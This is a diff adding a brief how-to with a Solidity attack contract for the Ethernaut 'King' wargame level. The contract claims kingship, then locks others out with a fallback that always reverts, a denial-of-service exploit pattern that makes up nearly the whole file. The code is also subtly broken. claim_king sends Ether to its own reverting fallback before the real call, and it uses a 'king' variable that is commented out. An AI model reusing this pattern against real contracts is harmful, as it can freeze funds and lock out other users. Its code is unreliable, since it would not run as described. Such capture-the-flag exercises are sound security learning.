@@ -1,0 +1,27 @@
+#How To
+-------
+
+Attacked King.sol with ClaimKing using instance level address.
+
+contract ClaimKing {
+    // King public king = King(myInstance level address);
+    
+    // malicious contract and prep with it with 1 Ether
+    constructor() public payable {
+       
+    }
+    
+    // Trigger King fallback(), set this contract as the king
+    function claim_king() public payable{
+        (bool result, bytes memory data) = address(this).call.value(msg.value)("");
+        if(!result){
+        revert();
+        }
+         address(king).call.value(1000000000000000000).gas(4000000)("");
+    }
+    
+    // Deny anyone tries to claim i.e "king.transfer" trx from Ethernaut
+     function() external payable {
+         revert("Locked out");
+     }
+}
